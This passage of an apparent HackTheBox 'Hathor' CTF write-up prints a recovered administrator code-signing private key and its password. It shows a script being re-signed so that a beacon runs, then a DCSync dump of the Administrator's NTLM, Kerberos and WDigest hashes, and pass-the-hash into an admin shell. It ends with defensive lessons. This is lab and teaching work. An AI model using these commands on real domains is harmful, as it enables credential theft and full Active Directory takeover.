vN9CdU4zKFJDziKGi2Uo+zAlLFMcsPl+RbZu8HEFDgGThOrZ4Vn8NEuwuVfaGqu8
qhzT19sG053xxQKzxhTPlRaDJAyLeneJhfv07ASiu2OfdMjoI9+zkiNukp+5hmsP
ywm0pWwvH4qG/536yV0Y7oj1t2MS9I9ADaec6WYp7hXjWD1MlOxJnvT+fv/3DJNe
lgxWADl/6FXb9zbwYrk/yWlPMTwWYvgZddJs5tE119JYszLfetK9LNuY1qO+Mpv9
wU9J+/qFW7Bew1/4RmRExkfWcnLvt4IViv7JdhB5428g3ITL4csGAuk/MIj+o9/l
dVxD/Ss=
-----END CERTIFICATE-----
Bag Attributes
    localKeyID: 20 4F 12 47 3F D6 91 15 84 50 12 15 75 82 70 B2 57 01 D0 49
Key Attributes: <No Attributes>
-----BEGIN PRIVATE KEY-----
MIIEvgIBADANBgkqhkiG9w0BAQEFAASCBKgwggSkAgEAAoIBAQDcpj7+f5azohHf
ztUjiBPiSb+PDK2ONRL+mK0ubSPeywOCig3IjExJPxQTEiD1nkXJp95ZN8/G2ByT
++UI5ql4BQL8FLpJ8EhTLmfIFPAsVQBBnlAJPtqCe7QVHbPd9Ytoxv/Q0y8Q4gld
C+2jS8iByIdH2Dbd94hZV4DbQPzHOKFqiyu2oWv+Al4W20E4rhWKsVma6zlPosh3
7gnJwK5Gtv4kVE/Fb5iaiRF7Kzvn0HDryP59mIFPpEOlcNM0JOQF/AtnzT1k3kQ+
ZIFC3tEnbi/Mghe7Xq3DZGqhGceTyEf/hiN8iYOwq59qkWCeNCGESohpyVmSybXh
GvPglL9ZAgMBAAECggEANVcPFXD8mnJMheE3Tz6fJ+4SG9/BuQYFkHySKQ4DROGo
+I6tJFUeP/q6vJ1+UEIxtr0ZGFJQrU4jIncbeBpiz3vOq+fK3QL0SP+H4SuGoADw
bex6hrGmGzMSZqRmjfrE99BbmTzkPN2Xy+GNUhOI5i723Rxcry4ezRJFOTutn+8S
u9U6XUzMYG/BrcqKc9DsAFmO2343h3Yc+voxgtfX0063DrApCVqpdVn2oDX6wmy5
Ol2kK1eYlpL2hKvJVpq6O21gvgMOPFWQyPv/SqATt9khyiS5A1IdFElHFcM41+8N
BGIyYKdviR+bP8du2FE5p6OQ0fRFYwnx7SYJ+MRUbQKBgQDj9ftUcC4DwtYHS91S
dGHM+3CW7jiY3Bcv9JPnOq/HIkEXz02SGiMEpI/U0HRx6x8Gk+V2fLbYzGE5cik6
X4FWw3Y0zG+ieu5xEk/a+15SQ2sp+ubZq8PaB18CzVl33yIrOW1VpoZa5JXMQ4Yt
Evz1mOphBGK5MyIfXIOA9OJIewKBgQD3ygqP3KydGR/99eOrzMqU54Sjohi3Vkm1
zp2nWWn1Qze7XCo2n6+d5evbqgqvSV+sxQq9S2y4TAHB/l8jzdXGdWmTAmVXUPeL
9/0uzx1foATe42vIP4uRI3qETEG7SWwi5BFLT0DE1NMh5zC2IAjgtBwaUL+v2Tnr
n6AboqOxOwKBgHi3XSWE1kk1lwN8IDK24Mec6y1x71S7UCgb+2q6gDUSpafHJovU
/XBK+MO4s8FTwjVIgn3xYx6BdIboNn7r7mEU1vb0v7UqJjSIfvM2o+cqPoiXjkH8
nJVLy/t+5P7+kWiUW5q8uW9Olyj5JQefg4dHN+6yVNlAA7TZ1+WlSGMbAoGBALTF
zZbO449o+RIKBaMcsN6ZWQcYBvgaF4RvzEx+yvKHq20g/BsFvNVxG/URxOHEoewl
hIQ9Nn/t04p3zWkNjdxPZEpAATcGdtLChQ9VQpS05VjGiad51JR6UbOa/oloM1/x
CzzqANKYgb/GLp9wF4n3XFlGd9IOpFbmCaSfrtRpAoGBAK5Q9SUfkfEZDCLs+j/J
fc6acVdeP4ghqIxegdEr07kfogiXWFMAVCDXW3EYxz20I8n6QI5YgMM80TYAuLSO
Xx27eCbT6yWJtyqYDluuNIHjgYgFQI5BSzwLj/+ebL/Fua7MLTQroqrbcwRBf0rH
2ZmI5okNvKSgR9LxEs0/gtEs
-----END PRIVATE KEY-----
```

We can see it was issued by the CA for `Administrator`. Let's get more info about the EKU:

```bash
$ openssl pkcs12 -in \$RLYS3KF.pfx -clcerts -nokeys -passin pass:abceasyas123 | openssl x509 -text -noout | grep -A 2 "Extended Key Usage"
            X509v3 Extended Key Usage:
                Code Signing
            X509v3 Key Usage: critical
```

So it's used for signing code. Let's check for directories we can write in so maybe we can overwrite an executable or something:

```powershell
accesschk64.exe -w -u -s GinaWild C:\ -accepteula
Accesschk v6.15 - Reports effective permissions for securable objects
Copyright (C) 2006-2022 Mark Russinovich
Sysinternals - www.sysinternals.com

RW C:\$Recycle.Bin
RW C:\Get-bADpasswords
RW C:\Microsoft
RW C:\ProgramData
RW C:\share
RW C:\StorageReports
RW C:\$Recycle.Bin\S-1-5-21-3783586571-2109290616-3725730865-2663
RW C:\$Recycle.Bin\S-1-5-21-3783586571-2109290616-3725730865-2663\desktop.ini
RW C:\Get-bADpasswords\.git
RW C:\Get-bADpasswords\.gitignore
RW C:\Get-bADpasswords\Accessible
RW C:\Get-bADpasswords\CredentialManager.psm1
RW C:\Get-bADpasswords\Get-bADpasswords.ps1
RW C:\Get-bADpasswords\Get-bADpasswords_2.jpg
RW C:\Get-bADpasswords\Helper_Logging.ps1
RW C:\Get-bADpasswords\Helper_Passwords.ps1
RW C:\Get-bADpasswords\Image.png
RW C:\Get-bADpasswords\LICENSE.md
RW C:\Get-bADpasswords\New-bADpasswordLists-Common.ps1
RW C:\Get-bADpasswords\New-bADpasswordLists-Custom.ps1
RW C:\Get-bADpasswords\New-bADpasswordLists-customlist.ps1
RW C:\Get-bADpasswords\New-bADpasswordLists-Danish.ps1
RW C:\Get-bADpasswords\New-bADpasswordLists-English.ps1
RW C:\Get-bADpasswords\New-bADpasswordLists-Norwegian.ps1
RW C:\Get-bADpasswords\PSI
RW C:\Get-bADpasswords\README.md
RW C:\Get-bADpasswords\run.vbs
<SNIP>
```

Again, `C:\Get-bADpasswords\`. There's `run.vbs` we didn't check earlier:

```vbs
Set WshShell = CreateObject("WScript.Shell")
Command = "eventcreate /T Information /ID 444 /L Application /D " & _
    Chr(34) & "Check passwords" & Chr(34)
WshShell.Run Command
'' SIG '' Begin signature block
'' SIG '' MIIIkgYJKoZIhvcNAQcCoIIIgzCCCH8CAQExDzANBglg
<SNIP>
'' SIG '' lQgfLUl5qzTK6aRKc/nPVHD+yyQ=
'' SIG '' End signature block
```

Let's copy the `.pfx` to `C:\Get-bADpasswords\cert.pfx` and add the cert to our cert store:

```powershell
powershell "$Secure_String_Pwd = ConvertTo-SecureString 'abceasyas123' -AsPlainText -Force; Import-PfxCertificate -FilePath 'C:\Get-bADpasswords\cert.pfx' -CertStoreLocation Cert:\CurrentUser\My -Password $Secure_String_Pwd"

   PSParentPath: Microsoft.PowerShell.Security\Certificate::CurrentUser\My

Thumbprint                                Subject                                                                      
----------                                -------                                                                      
204F12473FD6911584501215758270B25701D049  CN=Administrator, CN=Users, DC=windcorp, DC=htb
```

Now as you remember in the beginning, there was the `Get-bADpasswords.ps1` file which retrieved passwords of users. How? By gaining access to `NTDIT.dit`. This indicates that an administrative user is running that script. This is exactly what `run.vbs` is indicating: it's creating a new event to run the powershell script. That's the key! As we can write that file, let's add a line to execute our beacon and see what happens:

```powershell
powershell /c "cp C:\Get-bADpasswords\Get-bADpasswords.ps1 C:\Get-bADpasswords\Get-bADpasswords.ps1.bak; echo '& C:\share\Bginfo64.exe' > C:\Get-bADpasswords\Get-bADpasswords.ps1; $cert = @(Get-ChildItem Cert:CurrentUser\My -codesigning)[0]; Set-AuthenticodeSignature C:\Get-bADpasswords\Get-bADpasswords.ps1 $cert; cscript C:\Get-bADpasswords\run.vbs"

    Directory: C:\Get-bADpasswords


SignerCertificate                         Status                                 Path                                  
-----------------                         ------                                 ----                                  
204F12473FD6911584501215758270B25701D049  Valid                                  Get-bADpasswords.ps1                  
Microsoft (R) Windows Script Host Version 5.812
Copyright (C) Microsoft Corporation. All rights reserved.
```

And we get a new connection:

![hathor-13.htb](/assets/img/ctf/data/hathor-13.png)

---

## 📈 4. Privilege Escalation (`bpassrunner` -> `Administrator`)

Now using that account we can try to DCSync / request a single entry for `Administrator`:

```powershell
powershell /c "Get-ADReplAccount -SamAccountName 'Administrator' -Server windcorp.htb"

DistinguishedName: CN=Administrator,CN=Users,DC=windcorp,DC=htb
Sid: S-1-5-21-3783586571-2109290616-3725730865-500
Guid: 526eb447-7a40-4fe9-b95a-f68e9d78efa1
SamAccountName: Administrator
SamAccountType: User
UserPrincipalName: 
PrimaryGroupId: 513
SidHistory: 
Enabled: True
UserAccountControl: NormalAccount, PasswordNeverExpires
AdminCount: True
Deleted: False
LastLogonDate: 6/22/2026 1:18:30 AM
DisplayName: 
GivenName: 
Surname: 
Description: Built-in account for administering the computer/domain
ServicePrincipalName: 
SecurityDescriptor: DiscretionaryAclPresent, SystemAclPresent, DiscretionaryAclAutoInherited, SystemAclAutoInherited, 
DiscretionaryAclProtected, SelfRelative
Owner: S-1-5-21-3783586571-2109290616-3725730865-512
Secrets
  NTHash: b3ff8d7532eef396a5347ed33933030f
  LMHash: 
  NTHashHistory: 
    Hash 01: b3ff8d7532eef396a5347ed33933030f
    Hash 02: 083feb16c35174cb0f0cae63f34d5b7b
    Hash 03: 525a8625a410e103120a55684d31ca1f
  LMHashHistory: 
    Hash 01: 39d3f07dfd8d05e9eff48c6934fff90a
    Hash 02: 42813ade3d911a4f3658221c38cfea58
  SupplementalCredentials:
    ClearText: 
    NTLMStrongHash: a00793847320902caa206e8e1f94158a
    Kerberos:
      Credentials:
        DES_CBC_MD5
          Key: 1a4cbf835bab620e
      OldCredentials:
        DES_CBC_MD5
          Key: 316dc23dadda5b32
      Salt: WINDCORP.COMAdministrator
      Flags: 0
    KerberosNew:
      Credentials:
        AES256_CTS_HMAC_SHA1_96
          Key: c5d2c64e5b14ae7da0d00e95fa826b8a1755e9901358352b0d273f3ad48bd93a
          Iterations: 4096
        AES128_CTS_HMAC_SHA1_96
          Key: 3a13f7631f449f83bb92de205015e619
          Iterations: 4096
        DES_CBC_MD5
          Key: 1a4cbf835bab620e
          Iterations: 4096
      OldCredentials:
        AES256_CTS_HMAC_SHA1_96
          Key: f96f29b664cfca10dd0a9ff0950fcff10cdbf95d563272e0060b2723febdb377
          Iterations: 4096
        AES128_CTS_HMAC_SHA1_96
          Key: b4717ce2bf9435b3685a1f3a9f9af591
          Iterations: 4096
        DES_CBC_MD5
          Key: 316dc23dadda5b32
          Iterations: 4096
      OlderCredentials:
        AES256_CTS_HMAC_SHA1_96
          Key: 10ccd2ca0da214cf1f45462e8b75cfaf3f4f5ff5871e9492da491d5686941447
          Iterations: 4096
        AES128_CTS_HMAC_SHA1_96
          Key: 47495d8390f18931a0fb506d4af2cae2
          Iterations: 4096
        DES_CBC_MD5
          Key: 015762feeafbf102
          Iterations: 4096
      ServiceCredentials:
      Salt: WINDCORP.COMAdministrator
      DefaultIterationCount: 4096
      Flags: 0
    WDigest:
      Hash 01: 7f736922059914d4875c9febbf929890
      Hash 02: 0345e807081a5011149f9da4255d413f
      Hash 03: b437a8e9a6d6e7315603d4cb33d4e90c
      Hash 04: 7f736922059914d4875c9febbf929890
      Hash 05: d7d506ef3de61f6ff144005cfeb4b2d3
      Hash 06: b83fdd7207aebf8f3c920353599983e4
      Hash 07: f8c15db0e57137889e6f226ef46dee14
      Hash 08: ce84b8be199d80f17e2aca5c364e09c6
      Hash 09: 17a454845ba784c2f55b2d0e79fb2f20
      Hash 10: 9664008cc85d882b43e56df8673ea661
      Hash 11: 98505f47e364e5124de29a88d13e0fee
      Hash 12: ce84b8be199d80f17e2aca5c364e09c6
      Hash 13: 7a51ad2f1306f66f8a27b1d7b1ddf6c6
      Hash 14: 0eab9010a84cee3ce7fcbd7cb5e19f41
      Hash 15: fd54b50b868a06c8069f880a2da0f738
      Hash 16: 99727c10523f58023cff69eaaaea5454
      Hash 17: c3d16761fc1e13193e8d81997c264ab0
      Hash 18: 2c52c6f2d181050b2c184504ac54d57e
      Hash 19: 5bd1dc316750432c39c1127bf1bf15e3
      Hash 20: 95d82ee1982eac428dac558e8bbd48d3
      Hash 21: b949ed5eb5d470d4b07673ee0986810f
      Hash 22: f57c959ee6a8232154752e087b1d9c2e
      Hash 23: 60396d41e23fb72597e65f8edf7867c6
      Hash 24: a92e1051bfa7fbfa0de02c7f4943a4c9
      Hash 25: ef8322e9e4936ce94ca94a7f6c2c2d8f
      Hash 26: c1fcb77241e1891260e313dc4a3b864b
      Hash 27: 4294af5563a57060a06a3b820e1cbd7d
      Hash 28: 820dee1c6375b5da136424e30ec61412
      Hash 29: 78015edbfa85b52575a46a474ac7f97e
Key Credentials:
Credential Roaming
  Created: 
  Modified: 
  Credentials: 
```

Here we go. `Administrator` : `b3ff8d7532eef396a5347ed33933030f`.

Let's get a ticket:

```bash
$ impacket-getTGT 'windcorp.htb/Administrator' -no-pass -hashes :b3ff8d7532eef396a5347ed33933030f -dc-ip hathor.windcorp.htb
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] Saving ticket in Administrator.ccache

$ KRB5CCNAME=$(pwd)/Administrator.ccache impacket-wmiexec windcorp.htb/administrator@hathor.windcorp.htb -k -no-pass
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
windcorp\administrator

C:\>type C:\Users\Administrator\Desktop\root.txt
[REDACTED]
```

![hathor-14.htb](/assets/img/ctf/data/hathor-14.png)

---

## 🧠 Learnings

1. **Secure Tool Outputs**: Automated auditing scripts (like password checkers) should never dump raw NTLM hashes or password data into cleartext CSV files stored in predictable or globally readable directories.
2. **Sanitize the Recycle Bin**: Deleting sensitive items like backup files or `.pfx` certificates does not actually remove them from disk; they must be permanently expunged so they cannot be harvested later.
3. **Defend Against DLL Hijacking**: Directories holding executable binaries or script interpreters that run automatically should never grant standard domain users write or modify permissions.
4. **Restrict AppLocker / Script Policy Code-Signing Certs**: Code-signing certificates that are trusted to bypass system execution policies (like `AllSigned`) must be strictly guarded; allowing standard users to find and use an administrative signing cert completely undermines script restriction policies.
5. **Audit DCSync Rights**: Directory replication privileges must be restricted solely to Domain Controllers and high-privilege sync accounts; keeping this privilege on intermediate service accounts creates a direct path to full Active Directory takeover.
